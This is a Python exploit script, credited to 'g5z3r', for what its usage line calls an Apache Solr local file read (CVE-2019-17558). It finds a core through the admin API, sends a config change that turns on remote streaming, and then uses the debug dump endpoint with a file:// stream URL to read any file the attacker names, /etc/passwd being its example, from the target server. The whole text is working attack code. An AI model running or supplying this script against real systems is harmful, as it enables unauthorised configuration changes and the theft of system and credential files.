# -*- coding:utf-8 -*-
# Author:g5z3r

import requests
import sys
import json
import urllib3
import argparse


urllib3.disable_warnings()
def main():
    if sys.argv.__len__() <= 2:
        print("usage:python Solr_LFI_CVE-2019-17558 -u http://www.xxx.com -p \"/etc/passwd\"")
        exit(0)
    else:
        parse = argparse.ArgumentParser()
        group = parse.add_mutually_exclusive_group()
        group.add_argument('-u',"--url",help='input target url,Example: http://192.168.1.1:8080')
        parse.add_argument('-p','--path',help='input filepath,Example: /etc/passwd',required=True)
        # group.add_argument('-f','--file',help='url list,Example: urls.txt')
        args = parse.parse_args()

        if args.url[-1:] == "/":
            host = args.url[:-1]
        else:
            host = args.url
        path = args.path
    headers = {
        "Accept":"*/*",
        "Accept-Language":"English",
        "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type":"application/json",
        "Connection":"close"
    }
    proxies = {
        "http":"http://127.0.0.1:9090",
        "https":"http://127.0.0.1:9090"
    }
    url = "/solr/admin/cores?indexInfo=false&wt=json"
    response = requests.get(url=host+url,headers=headers,proxies=proxies)
    core_name = next(iter(response.json()['status']))
    url = "/solr/" + core_name + "/config"
    data = {
        "set-property":{
            "requestDispatcher.requestParsers.enableRemoteStreaming":"true"
        }
    }
    response = requests.post(url=host+url,headers=headers,data=json.dumps(data),proxies=proxies)
    if "\"status\":0" not in response.text:
        print("[-]host " + host + " is not vulnable.")
        exit(0)
    url = "/solr/" + core_name + "/debug/dump?param=ContentStreams"
    data = "stream.url=file://" + path
    headers = {
        "Accept": "*/*",
        "Accept-Language": "English",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    response = requests.get(url=host+url,headers=headers,data=data,proxies=proxies)
    if "\"status\":0" not in response.text:
        print("[-]host " + host + " is not vulnable.")
        exit(0)
    else:
        print(response.json()['streams'][0]['stream'])

if __name__ == '__main__':
    main()

